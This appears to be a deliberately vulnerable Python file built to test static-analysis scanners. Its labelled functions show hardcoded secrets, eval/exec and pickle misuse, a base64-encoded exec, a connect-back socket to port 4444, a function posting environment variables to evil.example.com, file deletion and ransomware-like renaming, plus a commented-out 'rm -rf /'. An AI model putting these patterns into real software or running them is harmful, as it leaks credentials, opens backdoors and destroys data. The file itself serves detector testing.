# ===============================
# INTENTIONALLY VULNERABLE FILE
# For static analysis & sandbox testing ONLY
# ===============================

import os
import sys
import subprocess
import pickle
import socket
import base64
import requests

# ---- Hardcoded secrets (bad practice) ----
PASSWORD = "super_secret_password"
API_KEY = "AKIAIOSFODNN7EXAMPLE"
DB_PASSWORD = "root123"

# ---- Dangerous command execution ----
def run_system_command(cmd):
    os.system(cmd)  # BAD: command injection risk

def run_shell():
    subprocess.Popen(
        "echo vulnerable",
        shell=True   # BAD: shell=True
    )

# ---- Eval / exec abuse ----
def dynamic_exec(user_input):
    eval(user_input)     # BAD: arbitrary code execution
    exec(user_input)     # BAD: arbitrary code execution

# ---- Unsafe deserialization ----
def load_data(blob):
    return pickle.loads(blob)  # BAD: RCE risk

# ---- Suspicious obfuscation ----
def hidden_payload():
    encoded = "cHJpbnQoJ01BTElDSU9VUyBDT0RFJyk="
    decoded = base64.b64decode(encoded)
    exec(decoded)  # BAD

# ---- Network backdoor pattern ----
def connect_back():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.1.100", 4444))  # Suspicious hardcoded IP
    s.send(b"hello")
    s.close()

# ---- Credential exfiltration pattern ----
def steal_env():
    data = dict(os.environ)
    requests.post("http://evil.example.com/steal", json=data)

# ---- Infinite resource abuse ----
def cpu_burn():
    while True:
        pass  # Infinite loop

# ---- File system abuse ----
def wipe_files():
    os.remove("important.txt")  # destructive pattern

# ---- Fake ransomware-like logic (DO NOT RUN) ----
def fake_encrypt():
    for f in os.listdir("."):
        if f.endswith(".txt"):
            with open(f, "rb") as fh:
                content = fh.read()
            with open(f + ".locked", "wb") as out:
                out.write(content[::-1])  # reversible, but suspicious

# ---- Entry point (commented out for safety) ----
# if __name__ == "__main__":
#     run_system_command("rm -rf /")
